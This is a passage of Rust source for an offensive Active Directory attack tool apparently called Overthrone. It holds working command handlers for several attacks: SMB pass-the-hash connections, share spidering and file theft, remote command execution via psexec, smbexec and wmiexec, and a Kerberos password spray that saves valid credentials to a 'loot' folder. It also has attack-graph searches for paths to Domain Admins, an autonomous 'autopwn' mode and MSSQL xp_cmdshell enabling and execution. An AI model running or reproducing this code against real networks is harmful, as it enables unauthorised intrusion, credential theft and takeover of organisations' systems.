            banner::print_fail(&e);
            return 1;
        }
    };

    // Helper closure to connect
    let smb_connect = |target: &str| {
        let domain = creds.domain.clone();
        let username = creds.username.clone();
        let secret = secret.clone();
        let target = target.to_string();
        async move {
            if use_hash {
                overthrone_core::proto::smb::SmbSession::connect_with_hash(
                    &target, &domain, &username, &secret,
                )
                .await
            } else {
                overthrone_core::proto::smb::SmbSession::connect(
                    &target, &domain, &username, &secret,
                )
                .await
            }
        }
    };

    match action {
        SmbAction::Shares { target } => {
            let smb = match smb_connect(&target).await {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("SMB connect to {}: {}", target, e));
                    return 1;
                }
            };
            let shares = smb
                .check_share_access(&["C$", "ADMIN$", "IPC$", "SYSVOL", "NETLOGON", "print$"])
                .await;
            println!(
                "\n  {:<15} {:<10} {}",
                "Share".bold(),
                "Read".bold(),
                "Write".bold()
            );
            println!("  {}", "─".repeat(40));
            for s in &shares {
                let read = if s.readable {
                    "✓".green().to_string()
                } else {
                    "✗".red().to_string()
                };
                let write = if s.writable {
                    "✓".green().to_string()
                } else {
                    "✗".red().to_string()
                };
                println!("  {:<15} {:<10} {}", s.share_name, read, write);
            }
            banner::print_success(&format!(
                "{} shares found, {} readable",
                shares.len(),
                shares.iter().filter(|s| s.readable).count()
            ));
        }
        SmbAction::Admin { targets } => {
            // targets is a comma-separated string
            let target_list: Vec<&str> = targets.split(',').map(|t| t.trim()).collect();
            for target in &target_list {
                let smb = match smb_connect(target).await {
                    Ok(s) => s,
                    Err(e) => {
                        println!("{} {}: {}", "✗".red(), target, e);
                        continue;
                    }
                };
                let result = smb.check_admin_access().await;
                if result.has_admin {
                    println!(
                        "{} {} — {}",
                        "✓".green(),
                        target.bold(),
                        "ADMIN".green().bold()
                    );
                } else {
                    println!("{} {} — {}", "✗".red(), target, "no admin".dimmed());
                }
            }
            banner::print_success("Admin check completed");
        }
        SmbAction::Spider { target, extensions } => {
            let ext_list: Vec<String> = extensions
                .split(',')
                .map(|s| s.trim().to_lowercase())
                .filter(|s| !s.is_empty())
                .collect();

            println!(
                "{} Spidering shares on: {} (filtering: {})",
                "🕷".bright_black(),
                target.cyan(),
                ext_list.join(", ").yellow()
            );

            let smb = match smb_connect(&target).await {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("SMB connect: {}", e));
                    return 1;
                }
            };

            let candidate_shares = &[
                "C$", "ADMIN$", "Users", "Shares", "Public", "Data", "IT", "Backups", "Finance",
                "HR",
            ];
            let mut total_found = 0usize;

            for &share in candidate_shares {
                if !smb.check_share_read(share).await {
                    continue;
                }
                println!(
                    "  {} \\\\{}\\{}",
                    "▸".bright_black(),
                    target.cyan(),
                    share.yellow()
                );

                // BFS walk of the share
                let mut queue: Vec<String> = vec![String::new()];
                while let Some(dir) = queue.pop() {
                    let entries = match smb.list_directory(share, &dir).await {
                        Ok(e) => e,
                        Err(_) => continue,
                    };
                    for entry in entries {
                        if entry.is_directory {
                            if queue.len() < 5000 {
                                queue.push(entry.path.clone());
                            }
                        } else {
                            let name_lower = entry.name.to_lowercase();
                            let matched = ext_list.is_empty()
                                || ext_list
                                    .iter()
                                    .any(|ext| name_lower.ends_with(ext.as_str()));
                            if matched {
                                println!(
                                    "    {} \\\\{}\\{}\\{}  ({} bytes)",
                                    "📄".bright_black(),
                                    target,
                                    share,
                                    entry.path,
                                    entry.size
                                );
                                total_found += 1;
                            }
                        }
                    }
                }
            }

            if total_found == 0 {
                banner::print_warn("No matching files found");
            } else {
                banner::print_success(&format!("Spider found {} matching file(s)", total_found));
            }
        }
        SmbAction::Get { target, path } => {
            let smb = match smb_connect(&target).await {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("SMB connect: {}", e));
                    return 1;
                }
            };
            // Parse share and path from the path string (e.g. "C$/Users/file.txt")
            let (share, remote_path) = match path.split_once('/') {
                Some((s, p)) => (s, p),
                None => ("C$", path.as_str()),
            };
            match smb.read_file(share, remote_path).await {
                Ok(data) => {
                    let filename = std::path::Path::new(remote_path)
                        .file_name()
                        .unwrap_or_default()
                        .to_string_lossy()
                        .to_string();
                    let local_path = format!("./{}", filename);
                    match std::fs::write(&local_path, &data) {
                        Ok(_) => {
                            banner::print_success(&format!(
                                "Downloaded {} bytes to {}",
                                data.len(),
                                local_path
                            ));
                        }
                        Err(e) => {
                            banner::print_fail(&format!("Failed to write local file: {}", e));
                            return 1;
                        }
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Download failed: {}", e));
                    return 1;
                }
            }
        }
        SmbAction::Put {
            target,
            local,
            remote,
        } => {
            let smb = match smb_connect(&target).await {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("SMB connect: {}", e));
                    return 1;
                }
            };
            let data = match std::fs::read(&local) {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Cannot read {}: {}", local, e));
                    return 1;
                }
            };
            let (share, remote_path) = match remote.split_once('/') {
                Some((s, p)) => (s, p),
                None => ("C$", remote.as_str()),
            };
            match smb.write_file(share, remote_path, &data).await {
                Ok(_) => {
                    banner::print_success(&format!(
                        "Uploaded {} bytes to \\\\{}\\{}\\{}",
                        data.len(),
                        target,
                        share,
                        remote_path
                    ));
                }
                Err(e) => {
                    banner::print_fail(&format!("Upload failed: {}", e));
                    return 1;
                }
            }
        }
    }
    0
}

// cmd_exec
async fn cmd_exec(cli: &Cli, method: ExecMethod, target: &str, command: &str) -> i32 {
    banner::print_module_banner("EXECUTION");
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let (secret, use_hash) = match creds.secret_and_hash_flag() {
        Ok(s) => s,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };

    println!(
        "{} {} on {} via {:?}",
        "⚡".bright_black(),
        command.yellow(),
        target.cyan(),
        method
    );

    // Connect via SMB
    let smb = if use_hash {
        overthrone_core::proto::smb::SmbSession::connect_with_hash(
            target,
            &creds.domain,
            &creds.username,
            &secret,
        )
        .await
    } else {
        overthrone_core::proto::smb::SmbSession::connect(
            target,
            &creds.domain,
            &creds.username,
            &secret,
        )
        .await
    };

    let smb = match smb {
        Ok(s) => s,
        Err(e) => {
            banner::print_fail(&format!("SMB connect failed: {}", e));
            return 1;
        }
    };

    // Dispatch to the appropriate execution method — normalize to (success, output_string)
    use overthrone_core::exec::{psexec, smbexec, wmiexec};
    let exec_result: Result<(bool, String), overthrone_core::OverthroneError> = match method {
        ExecMethod::PsExec => {
            let cfg = psexec::PsExecConfig {
                command: command.to_string(),
                ..Default::default()
            };
            psexec::execute(&smb, &cfg)
                .await
                .map(|r| (r.success, r.output.unwrap_or_default()))
        }
        ExecMethod::SmbExec => smbexec::exec_command(&smb, command)
            .await
            .map(|r| (r.success, r.output)),
        ExecMethod::WmiExec => wmiexec::exec_command(&smb, command)
            .await
            .map(|r| (r.success, r.output)),
        ExecMethod::WinRm => {
            // WinRM falls back to smbexec for now
            smbexec::exec_command(&smb, command)
                .await
                .map(|r| (r.success, r.output))
        }
        ExecMethod::Auto => {
            // Try smbexec first (most reliable), fall back to psexec
            match smbexec::exec_command(&smb, command).await {
                Ok(r) => Ok((r.success, r.output)),
                Err(_) => {
                    let cfg = psexec::PsExecConfig {
                        command: command.to_string(),
                        ..Default::default()
                    };
                    psexec::execute(&smb, &cfg)
                        .await
                        .map(|r| (r.success, r.output.unwrap_or_default()))
                }
            }
        }
    };

    match exec_result {
        Ok((_, output)) => {
            if !output.is_empty() {
                println!("{}", output);
            }
            banner::print_success("Command executed");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("Execution failed: {}", e));
            1
        }
    }
}

// cmd_graph
async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> i32 {
    banner::print_module_banner("ATTACK GRAPH");

    let default_path = "attack_graph.json";

    match action {
        GraphAction::Build => {
            println!(
                "{}",
                "Building attack graph from LDAP enumeration...".bright_black()
            );

            // Require DC + creds for Build
            let domain = match require_dc_only_creds(cli) {
                Ok(d) => d,
                Err(e) => return e,
            };
            let dc = match require_dc(cli) {
                Ok(d) => d,
                Err(e) => return e,
            };
            let creds = match require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };

            let password = creds.password().unwrap_or("");
            println!(
                "  {} Connecting to {} as {}\\{}...",
                "▸".bright_black(),
                dc.cyan(),
                domain.cyan(),
                creds.username.cyan()
            );

            let mut session = match overthrone_core::proto::ldap::LdapSession::connect(
                &dc,
                &domain,
                &creds.username,
                password,
                false,
            )
            .await
            {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("LDAP connection failed: {}", e));
                    return 1;
                }
            };

            println!(
                "  {} Running full domain enumeration...",
                "▸".bright_black()
            );
            let enumeration = match session.full_enumeration().await {
                Ok(data) => data,
                Err(e) => {
                    banner::print_fail(&format!("Enumeration failed: {}", e));
                    let _ = session.disconnect().await;
                    return 1;
                }
            };
            let _ = session.disconnect().await;

            println!(
                "  {} Users: {}, Computers: {}, Groups: {}, Trusts: {}",
                "▸".bright_black(),
                enumeration.users.len().to_string().green(),
                enumeration.computers.len().to_string().green(),
                enumeration.groups.len().to_string().green(),
                enumeration.trusts.len().to_string().green(),
            );

            let mut graph = AttackGraph::new();
            graph.ingest_enumeration(&enumeration);

            let output_path = graph_file.unwrap_or(default_path);
            let json = match graph.export_json() {
                Ok(j) => j,
                Err(e) => {
                    banner::print_fail(&format!("Failed to export graph: {}", e));
                    return 1;
                }
            };
            if let Err(e) = std::fs::write(output_path, &json) {
                banner::print_fail(&format!("Failed to write {}: {}", output_path, e));
                return 1;
            }

            let stats = graph.stats();
            println!(
                "  {} Graph: {} nodes, {} edges",
                "▸".bright_black(),
                stats.total_nodes.to_string().green(),
                stats.total_edges.to_string().green(),
            );
            banner::print_success(&format!("Attack graph saved to {}", output_path));
        }

        GraphAction::View { input } => {
            let mut sources = input;
            if sources.is_empty() {
                let resolved_path = graph_file.unwrap_or(default_path);
                let path_obj = std::path::Path::new(resolved_path);

                if !path_obj.exists() {
                    banner::print_fail(&format!(
                        "Graph file not found: {}\n\nUsage:\n  overthrone graph view --input <FILE or DIR>\n  overthrone graph --file <FILE> view",
                        resolved_path
                    ));
                    return 1;
                }
                // If using default fallback, warn the user
                if graph_file.is_none() {
                    banner::print_info(&format!("Using default graph file: {}", resolved_path));
                }
                sources.push(resolved_path.to_string());
            }

            // Validate that all source files exist before launching the TUI
            for source in &sources {
                if !std::path::Path::new(source).exists() {
                    banner::print_fail(&format!("File not found: {}", source));
                    banner::print_info(
                        "Use --input or --file to specify a valid BloodHound JSON file.",
                    );
                    return 1;
                }
            }

            match tokio::task::spawn_blocking(move || bloodhound_viewer::run(&sources)).await {
                Ok(Ok(())) => {}
                Ok(Err(e)) => {
                    banner::print_fail(&format!("Graph visualizer failed: {}", e));
                    return 1;
                }
                Err(e) => {
                    banner::print_fail(&format!("Graph visualizer thread failed: {}", e));
                    return 1;
                }
            }
        }

        GraphAction::Gui { input, port } => {
            // Build sources: prefer explicit input; otherwise prefer graph_file, then docs demo JSON, then fallback
            let sources = if input.is_empty() {
                let resolved_path = graph_file.unwrap_or_else(|| {
                    if std::path::Path::new("docs/bloodhound-hierarchy-demo.json").exists() {
                        "docs/bloodhound-hierarchy-demo.json"
                    } else {
                        default_path
                    }
                });
                if graph_file.is_none() {
                    banner::print_info(&format!("Using default graph file: {}", resolved_path));
                }
                vec![resolved_path.to_string()]
            } else {
                input
            };

            // Flexible existence checks: try the literal path, then try converting backslashes,
            // and finally attempt to canonicalize.
            let mut missing = false;
            for source in &sources {
                let mut found = false;
                let p = std::path::Path::new(source);
                if p.exists() {
                    found = true;
                } else if source.contains('\\') {
                    let alt = source.replace('\\', "/");
                    if std::path::Path::new(&alt).exists() {
                        found = true;
                    }
                }
                if !found && p.canonicalize().map(|c| c.exists()).unwrap_or(false) {
                    found = true;
                }

                if !found {
                    banner::print_fail(&format!("Graph source not found: {}", source));
                    missing = true;
                }
            }
            if missing {
                banner::print_info(
                    "Use --input or --file to specify valid JSON files or directories.",
                );
                return 1;
            }

            if let Err(e) = overthrone_viewer::launch(&sources, port).await {
                banner::print_fail(&format!("Graph GUI failed: {}", e));
                return 1;
            }
        }

        GraphAction::Tree { input } => {
            let mut sources = input;
            if sources.is_empty() {
                let resolved_path = graph_file.unwrap_or(default_path);
                let path_obj = std::path::Path::new(resolved_path);

                if !path_obj.exists() {
                    banner::print_fail(&format!(
                        "Graph file not found: {}\n\nUsage:\n  overthrone graph tree --input <FILE or DIR>\n  overthrone graph --file <FILE> tree",
                        resolved_path
                    ));
                    return 1;
                }
                if graph_file.is_none() {
                    banner::print_info(&format!("Using default graph file: {}", resolved_path));
                }
                sources.push(resolved_path.to_string());
            }

            for source in &sources {
                if !std::path::Path::new(source).exists() {
                    banner::print_fail(&format!("File not found: {}", source));
                    banner::print_info(
                        "Use --input or --file to specify a valid BloodHound JSON file.",
                    );
                    return 1;
                }
            }

            match tokio::task::spawn_blocking(move || tree_viewer::run(&sources)).await {
                Ok(Ok(())) => {}
                Ok(Err(e)) => {
                    banner::print_fail(&format!("Tree visualizer failed: {}", e));
                    return 1;
                }
                Err(e) => {
                    banner::print_fail(&format!("Tree visualizer thread failed: {}", e));
                    return 1;
                }
            }
        }

        GraphAction::Path { from, to } => {
            let path = graph_file.unwrap_or(default_path);
            let graph = match AttackGraph::from_json_path(path) {
                Ok(g) => g,
                Err(e) => {
                    banner::print_fail(&format!("Failed to load graph from {}: {}", path, e));
                    banner::print_info("Run 'overthrone graph build' first, or use --file <path>");
                    return 1;
                }
            };

            println!(
                "  {} Finding path: {} → {}",
                "🗺".bright_black(),
                from.cyan(),
                to.cyan()
            );

            match graph.shortest_path(&from, &to) {
                Ok(attack_path) => {
                    println!();
                    println!("{}", attack_path);
                    banner::print_success(&format!(
                        "Path found: {} hops, cost {}",
                        attack_path.hop_count, attack_path.total_cost
                    ));
                }
                Err(e) => {
                    banner::print_fail(&format!("No path found: {}", e));
                    return 1;
                }
            }
        }

        GraphAction::PathToDa { from } => {
            let path = graph_file.unwrap_or(default_path);
            let graph = match AttackGraph::from_json_path(path) {
                Ok(g) => g,
                Err(e) => {
                    banner::print_fail(&format!("Failed to load graph from {}: {}", path, e));
                    banner::print_info("Run 'overthrone graph build' first, or use --file <path>");
                    return 1;
                }
            };

            // Extract domain from graph metadata, or guess from the 'from' node
            let domain = graph.metadata().get("domain").cloned().unwrap_or_else(|| {
                // Try to extract domain from "user@DOMAIN" format
                from.split('@').nth(1).unwrap_or("").to_string()
            });

            if domain.is_empty() {
                banner::print_fail(
                    "Cannot determine domain. Ensure graph has domain metadata or use USER@DOMAIN format.",
                );
                return 1;
            }

            println!(
                "  {} Finding paths to Domain Admins from {} in {}",
                "🗺".bright_black(),
                from.cyan(),
                domain.cyan()
            );

            let paths = graph.paths_to_da(&from, &domain);
            if paths.is_empty() {
                banner::print_fail("No paths to Domain Admins found");
                return 1;
            }

            println!();
            for (i, attack_path) in paths.iter().enumerate() {
                println!(
                    "  {} Path #{} (cost: {}, hops: {})",
                    "→".green(),
                    i + 1,
                    attack_path.total_cost,
                    attack_path.hop_count
                );
                println!("{}", attack_path);
            }
            banner::print_success(&format!("{} path(s) to Domain Admins found", paths.len()));
        }

        GraphAction::Stats => {
            let path = graph_file.unwrap_or(default_path);
            let graph = match AttackGraph::from_json_path(path) {
                Ok(g) => g,
                Err(e) => {
                    banner::print_fail(&format!("Failed to load graph from {}: {}", path, e));
                    banner::print_info("Run 'overthrone graph build' first, or use --file <path>");
                    return 1;
                }
            };

            let stats = graph.stats();
            println!();
            println!("  === Graph Statistics ===");
            println!("  Total nodes: {}", stats.total_nodes);
            println!("  Users: {}", stats.users);
            println!("  Computers: {}", stats.computers);
            println!("  Groups: {}", stats.groups);
            println!("  Domains: {}", stats.domains);
            println!("  GPOs: {}", stats.gpos);
            println!("  OUs: {}", stats.ous);
            println!("  Cert Templates: {}", stats.cert_templates);
            println!("  Total edges: {}", stats.total_edges);

            let hvt = graph.high_value_targets(10);
            if !hvt.is_empty() {
                println!();
                println!("  High-Value Targets:");
                for (name, node_type, degree) in &hvt {
                    println!("    {} ({:?}) - degree {}", name, node_type, degree);
                }
            }
            banner::print_success("Graph statistics displayed");
        }

        GraphAction::Export { output, bloodhound } => {
            let path = graph_file.unwrap_or(default_path);
            let graph = match AttackGraph::from_json_path(path) {
                Ok(g) => g,
                Err(e) => {
                    banner::print_fail(&format!("Failed to load graph from {}: {}", path, e));
                    banner::print_info("Run 'overthrone graph build' first, or use --file <path>");
                    return 1;
                }
            };

            let json = if bloodhound {
                println!(
                    "  {} Exporting in BloodHound-compatible format...",
                    "💾".bright_black()
                );
                graph.export_bloodhound()
            } else {
                println!(
                    "  {} Exporting in Overthrone JSON format...",
                    "💾".bright_black()
                );
                graph.export_json()
            };

            match json {
                Ok(data) => {
                    if let Err(e) = std::fs::write(&output, &data) {
                        banner::print_fail(&format!("Failed to write {}: {}", output, e));
                        return 1;
                    }
                    banner::print_success(&format!(
                        "Graph exported to {} ({} bytes)",
                        output,
                        data.len()
                    ));
                }
                Err(e) => {
                    banner::print_fail(&format!("Export failed: {}", e));
                    return 1;
                }
            }
        }
    }
    0
}

// cmd_spray
async fn cmd_spray(
    cli: &Cli,
    password: &str,
    userlist: Option<&str>,
    use_ldap: bool,
    delay: u64,
    jitter: u64,
    _concurrency: usize,
) -> i32 {
    banner::print_module_banner("PASSWORD SPRAY");

    let domain = match require_dc_only_creds(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    // Build username list: file -> LDAP -> embedded fallback
    let users: Vec<String> = if let Some(path) = userlist {
        match std::fs::read_to_string(path) {
            Ok(content) => content
                .lines()
                .map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty())
                .collect(),
            Err(e) => {
                banner::print_fail(&format!("Cannot read userlist {}: {}", path, e));
                return 1;
            }
        }
    } else if use_ldap {
        // Try anonymous LDAP enumeration; fallback to embedded on failure
        match overthrone_core::proto::ldap::LdapSession::connect(&dc, &domain, "", "", false).await
        {
            Ok(mut conn) => match conn.enumerate_users().await {
                Ok(ad_users) => ad_users.into_iter().map(|u| u.sam_account_name).collect(),
                Err(e) => {
                    banner::print_warn(&format!(
                        "LDAP enumerate failed, using embedded list: {}",
                        e
                    ));
                    overthrone_hunter::userenum::embedded_usernames()
                }
            },
            Err(e) => {
                banner::print_warn(&format!("LDAP connect failed, using embedded list: {}", e));
                overthrone_hunter::userenum::embedded_usernames()
            }
        }
    } else {
        overthrone_hunter::userenum::embedded_usernames()
    };

    println!(
        "{} Spraying {} users against {} with password '{}'",
        "🔑".bright_black(),
        users.len(),
        domain.cyan(),
        password.yellow()
    );
    println!(
        "{} Delay: {}ms  Jitter: {}ms",
        "⏱".bright_black(),
        delay,
        jitter
    );

    let mut valid_creds = Vec::new();
    let mut locked_out = 0u32;
    use futures::stream;
    use overthrone_core::proto::kerberos;
    use std::time::Duration;

    // Create a stream of tasks that each wait `delay + jitter` then attempt auth.
    let attempt_stream = stream::iter(users.clone().into_iter().map(|user| {
        let dc = dc.clone();
        let domain = domain.clone();
        let password = password.to_string();
        async move {
            // per-attempt spacing
            if delay > 0 {
                tokio::time::sleep(Duration::from_millis(delay)).await;
            }
            if jitter > 0 {
                let jitter_add = rand::random::<u64>() % jitter;
                tokio::time::sleep(Duration::from_millis(jitter_add)).await;
            }
            let res = kerberos::request_tgt(&dc, &domain, &user, &password, false).await;
            (user, res)
        }
    }))
    .buffer_unordered(_concurrency.max(1));

    futures::pin_mut!(attempt_stream);
    while let Some((user, res)) = attempt_stream.next().await {
        match res {
            Ok(_tgt) => {
                println!(
                    "  {} {}:{} — {}",
                    "✓".green(),
                    user.as_str().bold(),
                    password,
                    "VALID".green().bold()
                );
                valid_creds.push(user.clone());
            }
            Err(e) => {
                let err_str = format!("{}", e);
                if err_str.contains("KDC_ERR_CLIENT_REVOKED") || err_str.contains("LOCKED") {
                    println!(
                        "  {} {} — {}",
                        "⚠".yellow(),
                        user,
                        "LOCKED OUT".red().bold()
                    );
                    locked_out += 1;
                    if locked_out >= 3 {
                        banner::print_fail(
                            "3+ lockouts detected — aborting spray to avoid mass lockout",
                        );
                        return 1;
                    }
                } else {
                    tracing::debug!("  {} {}: {}", "✗".dimmed(), user, err_str);
                }
            }
        }
    }

    // Write valid creds to file
    if !valid_creds.is_empty() {
        let loot_dir = std::path::PathBuf::from("./loot");
        let _ = std::fs::create_dir_all(&loot_dir);
        let creds_file = loot_dir.join("spray_valid_creds.txt");
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&creds_file)
        {
            use std::io::Write;
            for user in &valid_creds {
                let _ = writeln!(f, "{}\\{}:{}", domain, user, password);
            }
        }
        banner::print_success(&format!(
            "{}/{} valid creds found! Written to ./loot/spray_valid_creds.txt",
            valid_creds.len(),
            users.len()
        ));
    } else {
        println!(
            "\n{} 0/{} valid credentials found",
            "→".dimmed(),
            users.len()
        );
    }
    0
}

async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
    banner::print_module_banner("AUTONOMOUS ATTACK");

    let _ovt_cfg = match crate::ovt_config::OverthroneConfig::load(args.config.as_deref()) {
        Ok(c) => c,
        Err(e) => {
            banner::print_warn(&format!("Config file warning: {}", e));
            crate::ovt_config::OverthroneConfig::default()
        }
    };

    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    let discovered_domain = if args.bootstrap_no_creds {
        if let Some(domain) = cli.domain.clone() {
            Some(domain)
        } else {
            discover_domain_from_rootdse(&dc).await
        }
    } else {
        None
    };

    let creds = if args.bootstrap_no_creds {
        if let Some(domain) = discovered_domain.as_deref() {
            banner::print_info(&format!(
                "No-credential bootstrap mode enabled (domain: {})",
                domain
            ));
        } else {
            banner::print_warn(
                "No-credential bootstrap mode enabled, but domain could not be auto-discovered. Continuing with pre-auth-only methods.",
            );
        }
        None
    } else {
        Some(match require_creds(cli) {
            Ok(c) => c,
            Err(e) => return e,
        })
    };

    if args.bootstrap_no_creds {
        let _ = cmd_pre_enum(cli, EnumTarget::Pre).await;
        let _ = cmd_pre_enum(cli, EnumTarget::Anonymous).await;
        let _ = commands_impl::cmd_rid(cli, 500, 2000, true).await;
        let preauth_domain = discovered_domain.clone().unwrap_or_default();
        run_preauth_snaffler(&dc, &preauth_domain).await;

        let ue_cfg = overthrone_hunter::UserEnumConfig {
            userlist: args
                .userlist
                .as_ref()
                .map(std::path::PathBuf::from)
                .unwrap_or_default(),
            output_file: None,
            save_asrep_hashes: true,
            concurrency: args.concurrency,
            use_ldap: args.use_ldap,
        };
        banner::print_info("Running preauth username enumeration (bootstrap)");
        if let Ok(res) =
            overthrone_hunter::userenum::run(&dc, &preauth_domain, &ue_cfg, args.jitter_ms).await
        {
            banner::print_info(&format!(
                "Preauth enumeration discovered {} valid users ({} no-preauth)",
                res.valid_users.len() + res.no_preauth_users.len(),
                res.no_preauth_users.len()
            ));
        } else {
            banner::print_warn("Preauth userenum failed");
        }
    }

    let initial_state = if let Some(session_path) = args.resume.as_deref() {
        match crate::session_store::load_session(std::path::Path::new(session_path)) {
            Ok(s) => {
                banner::print_info(&format!("Loaded session from {}", session_path));
                Some(s)
            }
            Err(e) => {
                banner::print_fail(&format!("Failed to load session: {}", e));
                return 1;
            }
        }
    } else {
        None
    };

    autopwn::run(dc, creds, discovered_domain, &args, initial_state).await
}

// cmd_mssql
async fn cmd_mssql(cli: &Cli, action: MssqlAction) -> i32 {
    use overthrone_core::mssql::{MssqlClient, MssqlConfig};

    banner::print_module_banner("MSSQL");
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    let password = match creds.password() {
        Some(p) => p.to_string(),
        None => {
            banner::print_fail(
                "MSSQL TDS authentication requires a plaintext password; \
                NT hash and Kerberos ticket auth are not supported over TDS",
            );
            return 1;
        }
    };

    match action {
        MssqlAction::Query {
            target,
            query,
            database,
        } => {
            println!(
                "{} Querying {} — database: {} — sql: {}",
                "🗄".bright_black(),
                target.cyan(),
                database.cyan(),
                query.yellow()
            );
            let config = MssqlConfig::new(&target)
                .with_ntlm_auth(&creds.domain, &creds.username, &password)
                .with_database(&database);
            let mut client = match MssqlClient::connect(config).await {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
                    return 1;
                }
            };
            match client.query(&query).await {
                Ok(result) => {
                    if result.columns.is_empty() {
                        banner::print_info("Query returned no columns");
                    } else {
                        let header = result.columns.join(" | ");
                        println!("{}", header.bold());
                        println!("{}", "-".repeat(header.len()));
                        for row in &result.rows {
                            let vals: Vec<&str> =
                                row.iter().map(|v| v.as_deref().unwrap_or("NULL")).collect();
                            println!("{}", vals.join(" | "));
                        }
                        banner::print_success(&format!("{} row(s) returned", result.rows.len()));
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Query failed: {}", e));
                    let _ = client.close().await;
                    return 1;
                }
            }
            let _ = client.close().await;
        }
        MssqlAction::XpCmdShell { target, command } => {
            println!(
                "{} Executing xp_cmdshell on {} — command: {}",
                "⚡".bright_black(),
                target.cyan(),
                command.yellow()
            );
            let config = MssqlConfig::new(&target)
                .with_ntlm_auth(&creds.domain, &creds.username, &password)
                .with_database("master");
            let mut client = match MssqlClient::connect(config).await {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
                    return 1;
                }
            };
            match client.execute_xp_cmdshell(&command).await {
                Ok(output) => {
                    if output.is_empty() {
                        banner::print_info("Command produced no output");
                    } else {
                        println!("{}", output);
                    }
                    banner::print_success("xp_cmdshell executed");
                }
                Err(e) => {
                    banner::print_fail(&format!("xp_cmdshell failed: {}", e));
                    let _ = client.close().await;
                    return 1;
                }
            }
            let _ = client.close().await;
        }
        MssqlAction::LinkedServers { target } => {
            println!(
                "{} Enumerating linked servers on {}",
                "🔗".bright_black(),
                target.cyan()
            );
            let config = MssqlConfig::new(&target)
                .with_ntlm_auth(&creds.domain, &creds.username, &password)
                .with_database("master");
            let mut client = match MssqlClient::connect(config).await {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
                    return 1;
                }
            };
            match client.enumerate_linked_servers().await {
                Ok(servers) => {
                    if servers.is_empty() {
                        banner::print_info("No linked servers found");
                    } else {
                        for srv in &servers {
                            print!(
                                "  {} {} | source: {} | provider: {}",
                                "→".cyan(),
                                srv.name.bold(),
                                srv.data_source.yellow(),
                                srv.provider.bright_black()
                            );
                            if srv.rpc_out_enabled {
                                print!("  [RPC-out]");
                            }
                            if srv.data_access_enabled {
                                print!("  [data-access]");
                            }
                            println!();
                        }
                        banner::print_success(&format!("{} linked server(s) found", servers.len()));
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Linked server enumeration failed: {}", e));
                    let _ = client.close().await;
                    return 1;
                }
            }
            let _ = client.close().await;
        }
        MssqlAction::EnableXpCmdShell { target } => {
            println!(
                "{} Enabling xp_cmdshell on {}",
                "🔓".bright_black(),
                target.cyan()
            );
            let config = MssqlConfig::new(&target)
                .with_ntlm_auth(&creds.domain, &creds.username, &password)
                .with_database("master");
            let mut client = match MssqlClient::connect(config).await {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
                    return 1;
                }
            };
            match client.enable_xp_cmdshell().await {
                Ok(()) => {
                    banner::print_success("xp_cmdshell enabled successfully");
                }
                Err(e) => {
                    banner::print_fail(&format!("Failed to enable xp_cmdshell: {}", e));
                    let _ = client.close().await;
                    return 1;
                }
            }
            let _ = client.close().await;
        }
        MssqlAction::CheckXpCmdShell { target } => {
            println!(
                "{} Checking xp_cmdshell status on {}",
                "🔍".bright_black(),
                target.cyan()
            );
            let config = MssqlConfig::new(&target)
                .with_ntlm_auth(&creds.domain, &creds.username, &password)
                .with_database("master");
            let mut client = match MssqlClient::connect(config).await {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("Connect to {} failed: {}", target, e));
                    return 1;
                }
            };
            match client.check_xp_cmdshell().await {
                Ok(enabled) => {
                    if enabled {
                        banner::print_success("xp_cmdshell is ENABLED");
                    } else {
                        banner::print_info("xp_cmdshell is DISABLED");
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Status check failed: {}", e));
                    let _ = client.close().await;
                    return 1;
                }
            }
            let _ = client.close().await;
        }
    }
    0
}

#[cfg(test)]
mod cli_parse_tests {
    use super::*;

    #[test]
    fn report_output_flag_keeps_string_type_and_public_name() {
        let cli = Cli::try_parse_from([
            "ovt",
            "report",
            "--input",
            "engagement.json",
            "--output",
            "owner-report.md",
            "--format",
            "markdown",
        ])
        .expect("report command should parse --output without clap type mismatch");

        match *cli.command {
            Commands::Report {
                ref input,
                ref output,
                format: ReportFormat::Markdown,
            } => {
                assert_eq!(input, "engagement.json");
                assert_eq!(output, "owner-report.md");
            }
            _ => panic!("expected parsed report command"),
        }
    }

    #[test]
    fn kerberos_user_enum_output_flag_keeps_optional_type_and_public_name() {
        let cli = Cli::try_parse_from([
            "ovt",
            "kerberos",
            "user-enum",
            "-H",
            "127.0.0.1",
            "-d",
            "example.local",
            "-U",
            "users.txt",
            "--output",
            "valid-users.txt",
            "--delay",
            "10",
        ])
        .expect("kerberos user-enum should parse --output without clap type mismatch");

        match *cli.command {
            Commands::Kerberos {
                action:
                    KerberosAction::UserEnum {
                        ref userlist,
                        ref output,
                        delay,
                        concurrency,
                        use_ldap,
                    },
            } => {
                assert_eq!(userlist.as_deref(), Some("users.txt"));
